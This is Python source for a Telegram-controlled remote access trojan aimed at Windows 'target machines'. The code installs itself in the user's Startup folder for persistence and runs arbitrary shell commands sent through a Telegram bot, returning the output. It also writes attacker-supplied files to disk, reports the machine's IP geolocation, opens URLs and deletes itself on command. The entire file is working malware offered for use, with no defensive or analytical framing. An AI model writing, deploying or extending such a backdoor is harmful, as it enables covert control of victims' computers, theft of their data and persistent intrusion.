import telebot
import os
import subprocess
import requests
from getpass import getuser
import shutil
import webbrowser


class LhackerKarim:
    def __init__(self, telegram_token, chat_id, program_name):
        self.telegram_token = telegram_token
        self.chat_id = chat_id
        self.program_name = program_name
        self.execute_shell = True

        # Start the Telegram bot
        self.bot = telebot.TeleBot(self.telegram_token)

        # Handler for incoming messages
        @self.bot.message_handler(content_types=['document'])
        def handle_incoming_message(message):
            if message.document:
                file_info = self.bot.get_file(message.document.file_id)
                file_path = file_info.file_path
                downloaded_file = self.bot.download_file(file_path)

                # Specify the path where you want to save the received file
                upload_path = message.caption.strip()

                with open(upload_path, 'wb') as file:
                    file.write(downloaded_file)

                self.send_message(f"🕵File uploaded to {upload_path}")
            else:
                self.handle_message(message.text)

    # Function to send a message to the Telegram bot
    def send_message(self, message):
        self.bot.send_message(self.chat_id, message)

    # Function to handle incoming commands from the Telegram bot
    def handle_command(self, command):
        if command.lower() == "exit":
            self.send_message("🏴‍☠Server is shutting down...🏴‍☠")
            exit(0)
        elif command.lower() == "help":
            available_commands = [
                "/help - Show available commands",
                "/exit - Shut down the server",
                "/download <file_path> - Send a file to the bot",
                "/upload - Receive a file from the bot and upload it",
                "/shell <command> - Execute a shell command",
                "/shelloff - Stop executing shell commands",
                "/location - Get the location of the target machine",
                "/destroy - Remove the bot",
                "/openurl <url> - Open a URL in the default browser"
            ]
            command_list = "\n".join(available_commands)
            self.send_message(f"🛑Available commands:\n{command_list}")
        elif command.lower() == "download":
            self.send_message("🌐Please provide the file path to download.🌐")
        elif command.lower().startswith("upload"):
            self.send_message("🌐Please upload the file to upload.🌐")
        elif command.lower().startswith("shell"):
            shell_command = command.lower().split(" ", 1)[-1].strip()
            if self.execute_shell:
                try:
                    result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT,
                                                     encoding='utf-8')
                    self.send_message(result)
                except subprocess.CalledProcessError as e:
                    self.send_message(f"🆘Command execution failed with error: {e.output}")
            else:
                self.send_message("🕷️Shell commands are currently disabled. Use /shelloff to enable them.🕷️")
        elif command.lower() == "shelloff":
            self.execute_shell = False
            self.send_message("🕷️Shell commands are now disabled.🕷️")
        elif command.lower() == "location":
            location = self.get_location()
            self.send_message(location)
        elif command.lower() == "destroy":
            self.send_message("🕷️Bot self-destruct sequence initiated...🕷️")
            self.bot.stop_polling()
            self.bot.remove_webhook()
            self.send_message("🏴Bot has been destroyed.🏴")
            os.remove(f"{self.program_name}.exe")
        elif command.lower().startswith("openurl"):
            url = command.lower().split(" ", 1)[-1].strip()
            self.open_website(url)
        else:
            self.send_message("⚠Invalid command⚠")

    # Function to handle incoming messages from the Telegram bot
    def handle_message(self, message):
        if message.startswith('/'):
            command = message[1:]
            self.handle_command(command)
        else:
            self.send_message("⚠Invalid command⚠")

    # Function to get the location of the target machine
    def get_location(self):
        # Use an IP Geolocation API to obtain the location information
        response = requests.get("https://ipgeolocationapi.com/json/")
        data = response.json()
        location = f"Location:\nIP: {data['ip']}\nCity: {data['city']}\nRegion: {data['region']}\nCountry: {data['country_name']}"
        return location
     # Function to open a URL in the default browser
    def open_website(self, url):
        try:
            webbrowser.open(url)
            self.send_message("🌐Successfully opened the URL in the default browser.")
        except Exception as e:
            self.send_message(f"❌Failed to open the URL: {str(e)}")
    def start_bot(self):
        # Send the greeting message
        self.send_message("🕵Hello! Sir, Your Bot Is Started Successfully🕵")

        # Send the current working directory
        self.send_message("🏴‍☠️Current working directory: " + os.getcwd())

        # Check if the script is already in the startup folder
        user_name = getuser()
        startup = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        startup_path = os.path.join(startup, f"{self.program_name}.exe")

        if os.path.exists(startup_path):
            self.send_message("🏴‍☠️The bot is already in the startup folder.🏴‍☠️")
        else:
            copy_result = -1  # Initialize with a default value
            try:
                # Copy the script to the Windows startup folder
                copy_command = f'copy "{self.program_name}.exe" "{startup}"'
                copy_result = os.system(copy_command)
            except Exception as e:
                self.send_message("🛑Failed to copy the bot to the startup folder.🛑")
                self.send_message(str(e))

            if copy_result == 0:
                self.send_message("🏴‍☠️Bot has been successfully copied to the startup folder.🏴‍☠️")
                if os.path.exists(startup_path):
                    self.send_message("🏴‍☠️The bot is now in the startup folder.🏴‍☠️")
                else:
                    self.send_message("🏴‍☠️Failed to verify the bot in the startup folder.🏴‍☠️")

        # Start the bot
        self.bot.polling()
